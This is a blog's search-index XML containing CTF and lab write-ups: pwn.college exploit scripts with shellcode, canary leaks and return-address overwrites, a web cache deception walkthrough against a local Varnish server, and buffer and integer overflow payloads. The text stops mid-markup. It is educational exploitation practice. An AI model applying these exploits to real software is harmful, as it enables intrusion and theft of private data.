<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/28/hello-world/"/>
    <url>/2023/01/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college: Exploitation Scenarios</title>
    <link href="/2022/03/22/2022-3-22-Exploitation-Scenario/"/>
    <url>/2022/03/22/2022-3-22-Exploitation-Scenario/</url>
    
    <content type="html"><![CDATA[<h1 id="This-is-a-test-of-callouts"><a href="#This-is-a-test-of-callouts" class="headerlink" title="This is a test of callouts."></a>This is a test of callouts.</h1><blockquote><p>[!Tip]<br>hello</p></blockquote><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><p>这一题是让我们先输入一段shellcode，然后输入一个buffer。最简单的想法就是通过溢出将返回地址改为shellcode地址即可。这里的shellcode简单起见直接用前面获取flag的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;/challenge/toddlerone_level1.0&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rbx, 0x00000067616c662f     # push &quot;/flag&quot; filename</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rax, 2                              # syscall number of open</span><br><span class="hljs-string">mov rdi, rsp                            # point the first argument at stack (&quot;/flag&quot;).</span><br><span class="hljs-string">mov rsi, 0                              # NULL out the second argument (meaning, O_RDONLY).</span><br><span class="hljs-string">syscall                         # trigger open(&quot;/flag&quot;, NULL).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1                              # first argument to sendfile is the file descriptor to output to (stdout).</span><br><span class="hljs-string">mov rsi, rax                            # second argument is the file descriptor returned by open</span><br><span class="hljs-string">mov rdx, 0                              # third argument is the number of bytes to skip from the input file</span><br><span class="hljs-string">mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file</span><br><span class="hljs-string">mov rax, 40                             # syscall number of sendfile</span><br><span class="hljs-string">syscall                         # trigger sendfile(1, fd, 0, 1000).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, 60                             # syscall number of exit</span><br><span class="hljs-string">syscall                         # trigger exit().</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>log.success(<span class="hljs-built_in">str</span>(payload))<br>r.send(payload)<br><span class="hljs-comment"># return addr: 0x1d9ae000</span><br>r.sendline(<span class="hljs-string">&quot;112&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">103</span> +<span class="hljs-string">b&#x27;\xbb&#x27;</span>+ <span class="hljs-string">b&#x27;\x00\xe0\x9a\x1d\x00\x00\x00\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>这一题同样没有canary和aslr，而且栈上的代码可以执行。所以可以直接把shellcode输入进buffer然后overflow返回地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;/challenge/toddlerone_level2.0&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rbx, 0x00000067616c662f     # push &quot;/flag&quot; filename</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rax, 2                              # syscall number of open</span><br><span class="hljs-string">mov rdi, rsp                            # point the first argument at stack (&quot;/flag&quot;).</span><br><span class="hljs-string">mov rsi, 0                              # NULL out the second argument (meaning, O_RDONLY).</span><br><span class="hljs-string">syscall                         # trigger open(&quot;/flag&quot;, NULL).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1                              # first argument to sendfile is the file descriptor to output to (stdout).</span><br><span class="hljs-string">mov rsi, rax                            # second argument is the file descriptor returned by open</span><br><span class="hljs-string">mov rdx, 0                              # third argument is the number of bytes to skip from the input file</span><br><span class="hljs-string">mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file</span><br><span class="hljs-string">mov rax, 40                             # syscall number of sendfile</span><br><span class="hljs-string">syscall                         # trigger sendfile(1, fd, 0, 1000).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, 60                             # syscall number of exit</span><br><span class="hljs-string">syscall                         # trigger exit().</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>log.success(<span class="hljs-built_in">str</span>(payload))<br><span class="hljs-comment"># return addr: 0x7fffffffd4f0</span><br>r.sendline(<span class="hljs-string">&quot;129&quot;</span>)<br>r.sendline(payload+ <span class="hljs-string">b&#x27;\xaa&#x27;</span>*<span class="hljs-number">48</span> +<span class="hljs-string">b&#x27;\xd0\xd4\xff\xff\xff\x7f\x00\x00&#x27;</span> )<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><p>这一题的stack仍然可执行，但是有了canary，并且aslr也启用了。tong s同时还有后门，尝试输入以下REPEAT发现还是以前的后门。思路就是先用REPEAT运行一遍，获取到canary后在第二次运行时注入shellcode并overflow canary和返回地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>s = process(<span class="hljs-string">&quot;/challenge/toddlerone_level3.0&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rbx, 0x00000067616c662f     # push &quot;/flag&quot; filename</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rax, 2                              # syscall number of open</span><br><span class="hljs-string">mov rdi, rsp                            # point the first argument at stack (&quot;/flag&quot;).</span><br><span class="hljs-string">mov rsi, 0                              # NULL out the second argument (meaning, O_RDONLY).</span><br><span class="hljs-string">syscall                         # trigger open(&quot;/flag&quot;, NULL).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1                              # first argument to sendfile is the file descriptor to output to (stdout).</span><br><span class="hljs-string">mov rsi, rax                            # second argument is the file descriptor returned by open</span><br><span class="hljs-string">mov rdx, 0                              # third argument is the number of bytes to skip from the input file</span><br><span class="hljs-string">mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file</span><br><span class="hljs-string">mov rax, 40                             # syscall number of sendfile</span><br><span class="hljs-string">syscall                         # trigger sendfile(1, fd, 0, 1000).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, 60                             # syscall number of exit</span><br><span class="hljs-string">syscall                         # trigger exit().</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>log.success(<span class="hljs-built_in">str</span>(payload))<br><span class="hljs-comment"># First run, get canary</span><br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>s.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br>s.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>s.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(s.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;canary =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>s.sendline(<span class="hljs-string">&quot;113&quot;</span>)<br><span class="hljs-built_in">print</span>(s.recvuntil(<span class="hljs-string">&quot;This will allow you to write from 0x&quot;</span>))<br>addr = <span class="hljs-built_in">int</span>(s.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br>s.sendline(payload + <span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">16</span> + p64(canary) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">8</span> + p64(addr))<br>s.interactive()<br></code></pre></td></tr></table></figure><h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4><p>最后一题了，有点小激动。<br>This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()<br>call to see the hidden backdoor!<br>Goodbye!<br>This challenge will, by default, exit() instead of returning from the<br>challenge function. When a process exit()s, it ceases to exist immediately,<br>and no amount of overwritten return addresses will let you hijack its control<br>flow. You will have to reverse engineer the program to understand how to avoid<br>making this challenge exit(), and allow it to return normally.<br>exit() condition triggered. Exiting!<br>这一题同样有后门，而且还有一个退出机制。测试了一下，后门仍然是REPEAT，先用上一题的代码测试一下有什么问题。输入后不显示flag，看来需要看一下源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (var_18h != <span class="hljs-number">-0x60b4f47fafa53d83</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exit() condition triggered. Exiting!&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0x2a</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>具体的汇编代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov    rax,QWORD PTR [rbp-0x18]<br>movabs rdx,0x9f4b0b80505ac27d<br>cmp    rax,rdx<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>s = process(<span class="hljs-string">&quot;/challenge/toddlerone_level4.0&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rbx, 0x00000067616c662f     # push &quot;/flag&quot; filename</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rax, 2                              # syscall number of open</span><br><span class="hljs-string">mov rdi, rsp                            # point the first argument at stack (&quot;/flag&quot;).</span><br><span class="hljs-string">mov rsi, 0                              # NULL out the second argument (meaning, O_RDONLY).</span><br><span class="hljs-string">syscall                         # trigger open(&quot;/flag&quot;, NULL).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1                              # first argument to sendfile is the file descriptor to output to (stdout).</span><br><span class="hljs-string">mov rsi, rax                            # second argument is the file descriptor returned by open</span><br><span class="hljs-string">mov rdx, 0                              # third argument is the number of bytes to skip from the input file</span><br><span class="hljs-string">mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file</span><br><span class="hljs-string">mov rax, 40                             # syscall number of sendfile</span><br><span class="hljs-string">syscall                         # trigger sendfile(1, fd, 0, 1000).</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, 60                             # syscall number of exit</span><br><span class="hljs-string">syscall                         # trigger exit().</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>log.success(<span class="hljs-built_in">str</span>(payload))<br><span class="hljs-comment"># First run, get canary</span><br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>s.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br>s.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>s.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(s.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;canary =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>s.sendline(<span class="hljs-string">&quot;113&quot;</span>)<br><span class="hljs-built_in">print</span>(s.recvuntil(<span class="hljs-string">&quot;Our stack pointer points to 0x&quot;</span>))<br>rbp = <span class="hljs-built_in">int</span>(s.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>rbp = rbp + <span class="hljs-number">0x40</span><br>log.success(<span class="hljs-string">&quot;rbp =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(rbp)))<br><span class="hljs-built_in">print</span>(s.recvuntil(<span class="hljs-string">&quot;This will allow you to write from 0x&quot;</span>))<br>addr = <span class="hljs-built_in">int</span>(s.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br>s.sendline(payload +  <span class="hljs-string">b&#x27;\x7d\xc2\x5a\x50\x80\x0b\x4b\x9f&#x27;</span> +<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">8</span> + p64(canary) + p64(rbp) + p64(addr))<br>s.interactive()<br><br></code></pre></td></tr></table></figure><p>完结撒花</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn.college</tag>
      
      <tag>Exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web Cache Deception Attack Simulaton</title>
    <link href="/2022/03/16/2022-3-16-Web-Cache-Deception-Attack-Instruction/"/>
    <url>/2022/03/16/2022-3-16-Web-Cache-Deception-Attack-Instruction/</url>
    
    <content type="html"><![CDATA[<h1 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h1><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><ul><li>Platform: Ubuntu Linux 20.04 64bit virtual machine.</li><li>Softwares:<ul><li>Web server: Apache2 + MySQL + PHP</li><li>Cache server: Varnish 6.6</li></ul></li></ul><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><ol><li><p>Login the virtual machine with both username and password set to <code>groupn</code>.</p></li><li><p>Open a terminal using <code>Ctrl+Alt+T</code></p></li><li><p>Check the IP address of the machine, by default it should be <code>10.0.2.15</code>.<br> <code>$ ifconfig</code></p></li><li><p>To start Apache2 and Varnish services, run the following commands. (<code>default.vcl</code> is the main configuration file of Varnish)</p> <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo systemctl start apache2<br>sudo varnishd -f <span class="hljs-regexp">/etc/</span>varnish/<span class="hljs-keyword">default</span>.vcl<br></code></pre></td></tr></table></figure></li><li><p>Check the status of Apache2 and Varnish</p> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo systemctl status apache2<br><span class="hljs-keyword">ps</span> -ef|<span class="hljs-keyword">grep</span> varnishd<br></code></pre></td></tr></table></figure><p>  ![apache-status](&#x2F;Users&#x2F;tingyi&#x2F;Library&#x2F;CloudStorage&#x2F;OneDrive-UniversityCollegeLondon&#x2F;Modules&#x2F;COMP0055 Compyter Security II&#x2F;Coursework 1&#x2F;wcd&#x2F;apache-status.png)<br> <img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay24lbx8j21ph0ai40t.jpg" alt="varnish-status"></p></li><li><p>Now you can access our website via Varnish. Open Firefox web browser, type <code>10.0.2.15</code> in the address bar and  return.</p></li><li><p>Click on the link on the page and you will be directed to the login page. Then you can login to our website with the preset credentials:</p> <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> groupn<br><span class="hljs-symbol">password:</span> groupn<br></code></pre></td></tr></table></figure></li><li><p>Now you are in the profile page where there are personal information such as phone numbers. And we can check the caching status of this page by entering the following command in the terminal:<br> <code>curl -I 10.0.2.15/profile.php</code><br> By default, this page should not be cached, so the Cache-tag header would be <code>Miss</code>.<br> <img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay2arsk5j21l80u0abn.jpg" alt="normal-page"><br> <img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay2hxbynj21ot0j8n1f.jpg" alt="normal-profile"></p></li><li><p>Add an arbitrary path that unlikely exists at the end of the current path, for example <code>/profile.php/nothing.css</code>, the file type should be one of the following types: <code>css, jpg, js, gif, png, xml, flv, gz, txt</code> , then press return.<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay35l9u1j21om0kbaed.jpg" alt="attack-nothing"></p></li><li><p>The page will change a little this time, but all the user data is still there. You can run <code>curl</code> command again.<br><code>curl -I 10.0.2.15/profile.php/nothing.css</code><br>And this time, the Cache-tag is set to <code>Hit</code>, meaning that this page is cached by Varnish. Now you can open a new private window on the browser and enter this path <code>10.0.2.15/profile.php/nothing.css</code>, and you will see that all the information in <code>profile.php</code> is now available.<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay3gpnvfj21lp0u0gn3.jpg" alt="attack-page"></p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0ay3u1ffuj21lq0u0gnc.jpg" alt="private-test"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college: Memory Error</title>
    <link href="/2022/03/12/2022-3-12-Memory-Error/"/>
    <url>/2022/03/12/2022-3-12-Memory-Error/</url>
    
    <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level&quot;</span>) <br>&lt;whatever needed <span class="hljs-keyword">for</span> level 7.1 <span class="hljs-keyword">to</span> work&gt;<br><span class="hljs-built_in">print</span>(r.readall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><br>import pwn<br><br>with pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level12.0&quot;</span>, <span class="hljs-attribute">setuid</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">aslr</span>=<span class="hljs-literal">False</span>) as process:<br>    pwn.gdb.attach(process)<br>    process.interactive()<br></code></pre></td></tr></table></figure><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><blockquote><p>In this level, there is a “win” variable.<br>By default, the value of this variable is zero.<br>However, when this variable is non-zero, the flag will be printed.<br>You can make this variable be non-zero by overflowing the input buffer.<br>The “win” variable is stored at 0x7ffcca200978, 88 bytes after the start of your input buffer.</p></blockquote><p>第一关需要把buffer后的一个变量的值改变，只需要有足够的输入即可。输入89个A后成功拿到flag。</p><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>The challenge() function has just been launched!<br>This challenge stores your input buffer on the heap!<br>It also stores the “win” variable on the heap.<br>Allocating memory for the input buffer…<br>Called malloc(106) &#x3D; 0x55b735a3b6b0<br>Called malloc(0x10) &#x3D; 0x55b735a3b730<br>Called malloc(0x10) &#x3D; 0x55b735a3b750<br>Called malloc(0x10) &#x3D; 0x55b735a3b770<br>Called malloc(0x10) &#x3D; 0x55b735a3b790<br>Called malloc(0x10) &#x3D; 0x55b735a3b7b0<br>Called malloc(0x10) &#x3D; 0x55b735a3b7d0<br>Allocating memory for the win variable…<br>Called calloc(1, sizeof(int)) &#x3D; 0x55b735a3b7f0<br>In this level, there is a “win” variable.<br>By default, the value of this variable is zero.<br>However, when this variable is non-zero, the flag will be printed.<br>You can make this variable be non-zero by overflowing the input buffer.<br>The “win” variable is stored at 0x55b735a3b7f0, 320 bytes after the start of your input buffer.</p><p>这一关略有不同，这次数据是在堆上，但仍然可以找到offset为0x55b735a3b7f0 - 0x55b735a3b6b0 &#x3D; 320。</p><h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7ffff0827268, 136 bytes after the start of your input buffer.<br>That means that you will need to input at least 144 bytes (113 to fill the buffer,<br>23 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).</p><p>这一关不是修改变量了，而是需要修改返回地址到特定函数。并且题目也解除了canary和地址随机化。我们只需要找到返回地址的offset然后覆盖即可。最终在iPython中使用pwntools实现：</p><p><code>r.send(b&#39;\x00&#39;*136+b&#39;\x0f\x1d\x40&#39;)</code></p><h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7ffc2743e7f8, 88 bytes after the start of your input buffer.<br>That means that you will need to input at least 96 bytes (60 to fill the buffer,<br>28 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).</p><p>This challenge is more careful: it will check to make sure you<br>don’t want to provide so much data that the input buffer will<br>overflow. But recall twos compliment, look at how the check is<br>implemented, and try to beat it!</p><p>同样的方法不成功了，这次需要使用一下补码，发送88字节的填充，再加最后8字节的返回地址。</p><h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7fffd2297b18, 88 bytes after the start of your input buffer.<br>That means that you will need to input at least 96 bytes (48 to fill the buffer,<br>40 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>This challenge will let you send multiple payload records concatenated together.<br>It will make sure that the total payload size fits in the allocated buffer<br>on the stack. Can you send a carefully crafted input to break this calculation?<br>You will want to overwrite the return value from challenge()<br>(located at 0x7ffdee130128, 88 bytes past the start of the input buffer)<br>with 0x402164, which is the address of the win() function.<br>This will cause challenge() to return directly into the win() function,<br>which will in turn give you the flag.</p><p>和上一题大体相同，如果按照正常的需求输入size，就会报以下错误:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">babymem_level5.0: &lt;stdin&gt;:143: challenge: Assertion `record_size * record_num &lt; (unsigned int) sizeof(input)&#x27; failed.<br></code></pre></td></tr></table></figure><p>看到这里用的是无符号数，容易想到可以通过补码来绕过限制。仍然在ipython中进行操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level5.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;2147483648&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;\x64\x21\x40\x00\x00\x00\x00\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win_authed() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7fff00d955f8, 120 bytes after the start of your input buffer.<br>That means that you will need to input at least 128 bytes (92 to fill the buffer,<br>28 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>One caveat in this challenge is that the win_authed() function must first auth:<br>it only lets you win if you provide it with the argument 0x1337.<br>Specifically, the win_authed() function looks something like:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 